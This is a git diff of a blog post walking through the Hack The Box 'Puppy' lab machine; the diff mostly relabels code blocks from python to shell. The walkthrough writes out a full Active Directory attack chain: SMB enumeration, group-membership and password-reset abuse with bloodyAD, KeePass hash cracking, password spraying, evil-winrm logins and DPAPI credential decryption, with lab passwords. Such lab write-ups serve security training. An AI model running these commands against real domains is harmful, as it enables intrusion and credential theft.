@@ -1,6 +1,6 @@
 ---
 title: "Hack The Box: Puppy Walkthrough"
-date: 2026-02-02 18:00:00 +0000
+date: 2025-01-30 
 categories: [HACK THE BOX]
 tags: [walkthrough, windows, active-directory, bloodhound, keepass, dpapi, ad]
 image:
@@ -26,7 +26,7 @@ image:
 
 The engagement begins with a set of valid domain credentials:
 
-```python
+```shell
 levi.james : KingofAkron2025!
 Target: 10.129.35.77
 Domain: puppy.htb
@@ -36,7 +36,7 @@ Domain: puppy.htb
 ### Share Enumeration
 I started by enumerating SMB shares using CrackMapExec:
 
-```python
+```shell
 crackmapexec smb 10.129.35.77 -u 'levi.james' -p 'KingofAkron2025!' --shares
 ```
 ![Desktop View](/assets/puppy/image1.png){: width="700" height="400" .normal }
@@ -46,20 +46,21 @@ SYSVOL → Accessible
 DEV → Access Denied
 
 ## SYSVOL Inspection
-```python
+```shell
 smbclient //10.129.35.77/SYSVOL -U levi.james --password='KingofAkron2025!'
-
-No useful files were found inside SYSVOL.
 ```
+No useful files were found inside SYSVOL.
+
 ![Desktop View](/assets/puppy/image2.png){: width="700" height="400" .normal }
 
 ## 0x03: Active Directory Enumeration
 ### BloodHound / RustHound
 
 Active Directory enumeration was performed using RustHound:
-```python
+```shell
 rusthound -d puppy.htb -u 'levi.james@puppy.htb' -p 'KingofAkron2025!' -o puppy.zip
 ```
+
 ![Desktop View](/assets/puppy/image3.png){: width="700" height="400" .normal }
 
 ![Desktop View](/assets/puppy/image4.png){: width="700" height="400" .normal }
@@ -69,7 +70,7 @@ BloodHound analysis revealed that levi.james has permission to modify the member
 ## 0x04: Privilege Abuse — Group Membership
 Using BloodyAD, I added levi.james to the DEVELOPERS group:
 
-```python
+```shell
 bloodyAD --host 10.129.35.77 \
   -u levi.james -p 'KingofAkron2025!' \
   add groupMember "DEVELOPERS" levi.james
@@ -80,13 +81,13 @@ bloodyAD --host 10.129.35.77 \
 ## 0x05: DEV Share Access
 With updated group membership, access to the DEV share was granted:
 
-```python
+```shell
 smbclient //10.129.35.77/DEV -U levi.james --password='KingofAkron2025!'
 ```
 ![Desktop View](/assets/puppy/image6.png){: width="700" height="400" .normal }
 
 
-```python
+```shell
 Discovered files:
 KeePassXC-2.7.9-Win64.msi
 recovery.kdbx
@@ -96,7 +97,7 @@ This strongly indicated that KeePass was being used to store credentials.
 
 ## 0x06: KeePass Database Attack
 ### Hash Extraction
-```python
+```shell
 keepass2john recovery.kdbx > kp.hash
 
 Cracking the Database
@@ -110,7 +111,7 @@ The KeePass master password was successfully cracked.
 
 
 Opening the KeePass database revealed multiple domain credentials:
-```python
+```shell
 adam.silver        : HJKL2025!
 ant.edwards        : Antman2025!
 jamie.williamson   : JamieLove2025!
@@ -120,7 +121,7 @@ steve.tucker       : Steve2025!
 ## 0x07: Password Spraying
 I sprayed the recovered credentials across available services using NetExec:
 
-```python
+```shell
 netexec winrm 10.129.35.77 -u users.txt -p passwords.txt --continue-on-success
 
 Valid credentials identified:
@@ -130,7 +131,7 @@ PUPPY.HTB\ant.edwards : Antman2025!
 ## 0x08: Further AD Enumeration
 Using the newly discovered user:
 
-```python
+```shell
 rusthound -d puppy.htb -u 'ant.edwards@puppy.htb' -p 'Antman2025!' -o puppy2.zip
 ```
 
@@ -138,7 +139,7 @@ BloodHound revealed that ant.edwards can modify the password of adam.silver.
 
 ## 0x09: Account Takeover — adam.silver
 ### Password Reset
-```python
+```shell
 bloodyAD --host 10.129.35.77 \
   -d puppy.htb \
   -u ant.edwards -p 'Antman2025!' \
@@ -150,7 +151,7 @@ Authentication initially failed because the account was disabled.
 
 
 ### Enable Account
-```python
+```shell
 bloodyAD --host 10.129.35.77 \
   -d puppy.htb \
   -u ant.edwards -p 'Antman2025!' \
@@ -159,7 +160,7 @@ bloodyAD --host 10.129.35.77 \
 ![Desktop View](/assets/puppy/image10.png){: width="700" height="400" .normal }
 
 ## 0x0A: WinRM Access
-```python
+```shell
 evil-winrm -i 10.129.35.77 -u adam.silver -p 'NewPassword123!'
 ```
 
@@ -173,7 +174,7 @@ nms-auth-config.xml.bak
 
 Inside the file, plaintext LDAP credentials were stored:
 
-```python
+```shell
 
 <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
 <bind-password>ChefSteph2025!</bind-password>
@@ -186,7 +187,7 @@ steph.cooper : ChefSteph2025!
 
 
 ### 0x0C: Steph Cooper Access
-```python
+```shell
 evil-winrm -i 10.129.35.77 -u steph.cooper -p 'ChefSteph2025!'
 ```
 
@@ -196,7 +197,7 @@ evil-winrm -i 10.129.35.77 -u steph.cooper -p 'ChefSteph2025!'
 
 DPAPI credential blobs were discovered at:
 
-```python
+```shell
 C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\
 Get-ChildItem C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials -Force
 ```
@@ -205,7 +206,7 @@ Get-ChildItem C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials -Force
 ### Locate DPAPI Master Keys
 
 Master keys were located under:
-```python
+```shell
 C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\
 SID identified:
 S-1-5-21-1487982659-1829050783-2281216199-1107
@@ -214,7 +215,7 @@ S-1-5-21-1487982659-1829050783-2281216199-1107
 ### DPAPI Decryption (Offline)
 Decrypt Master Key
 
-```python
+```shell
 impacket-dpapi masterkey \
  -file <masterkey_file> \
  -sid <SID> \
@@ -222,7 +223,7 @@ impacket-dpapi masterkey \
 ```
 
 ### Decrypt Credential Blob
-```python
+```shell
 impacket-dpapi credential \
  -file <credential_blob> \
  -key <decrypted_masterkey>
